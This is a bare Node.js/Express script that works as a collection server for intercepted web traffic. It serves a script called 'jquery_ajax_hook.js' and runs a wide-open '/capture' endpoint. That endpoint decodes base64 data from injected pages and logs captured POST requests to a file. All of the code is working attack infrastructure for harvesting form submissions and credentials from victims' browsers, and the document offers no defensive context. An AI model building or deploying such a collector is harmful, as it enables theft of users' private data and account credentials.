 var fs = require('fs'),
    http = require('http'),
    express = require('express'),
    app = express();
    http.createServer(app).listen(9090);

    app.get('/script.js', function (req, res) {
      res.header('Content-type', 'application/javascript');
      return res.end(fs.readFileSync('jquery_ajax_hook.js'));
    });

    app.get('/capture', function (req, res){
      var data = req.query.data;
      res.header('Content-type', 'application/json');
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Methods', 'POST');

      if (data){
          var b = new Buffer(data, 'base64')
          var s = b.toString();
          console.log(s);
          fs.appendFile('captured_post_reqs.txt', s +"\n", function (err) {});
          return res.end('{"post": "ok"}');
      }
      else{
          return res.end('{"post": "not_ok"}');
      }
      
    });
